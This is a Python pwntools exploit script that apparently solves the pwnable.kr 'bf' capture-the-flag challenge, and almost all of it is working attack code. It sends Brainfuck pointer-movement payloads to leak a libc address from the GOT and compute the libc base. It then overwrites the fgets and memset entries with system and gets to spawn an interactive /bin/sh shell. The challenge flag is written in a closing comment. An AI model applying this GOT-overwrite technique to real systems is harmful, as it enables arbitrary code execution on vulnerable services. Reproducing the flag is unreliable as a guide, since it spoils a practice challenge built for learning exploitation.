from pwn import *
import time


# idea is to get into putchar 

putchar_addr = 0x0804a030
fgets_addr = 0x0804a010
getchar_addr = 0x0804a00c
tape_start = 0x0804a0a0
strlen_addr = 0x0804a020
memset_addr = 0x0804a02c
puts_addr = 0x0804a018

#r = process('./bf_patched') # after calling pwninit 
r = remote('pwnable.kr', 9001)

# i forget what the comma is 
# it is getchar()
# . is putchar()
payload = b"<" * (tape_start - fgets_addr)
payload += b".>.>.>.>."  # read and increment 
payload += b">" * (putchar_addr - fgets_addr - 4)
payload += b',>' * 4
payload += b"."
""""""
""" gdb.attach(r, gdbscript=''' """
"""     b *0x0804861c """
"""     c """
"""     b *0x0804872d """
"""     x/10wx 0x804a080 """
""" ''') """
""""""
time.sleep(3)
l = r.sendlineafter("[ ]\n", payload)
#print(l)
leak = r.recv(1)
leak += r.recv(4)
leak = leak[::-1].hex()[2:]
print("leak: ", leak)

libc = ELF('./bf_libc.so')
libc_fgets = libc.symbols['fgets']
print("0x" + leak, hex(libc_fgets))

base = int(leak,16) - libc_fgets 
print("base: ", hex(base))

r.send(b"\x71\x86\x04\x08") # address of main

# read with fgets
# replace fgets with system
# replace got value with pointer to fgets

system = bytes.fromhex(hex(base+libc.symbols['system'])[2:])[::-1]
gets = bytes.fromhex(hex(base+libc.symbols['gets'])[2:])[::-1]
print(f"gets: {gets}")
payload = b"/bin/sh"
payload += b"<" * (tape_start - fgets_addr) # replace fgets with system 
payload += b",>" * 4
payload += b">" * (memset_addr - fgets_addr - 4)
payload += b",>" * 4 # replace "." with 0x08048734 
payload += b"+"
payload += b'.'

r.sendlineafter("[ ]\n", payload)

# need to do one more overwrite from memset to gets??


r.send(system)
r.send(gets)
r.sendline("/bin/sh")
r.interactive()



# flag: BrainFuck? what a weird language..

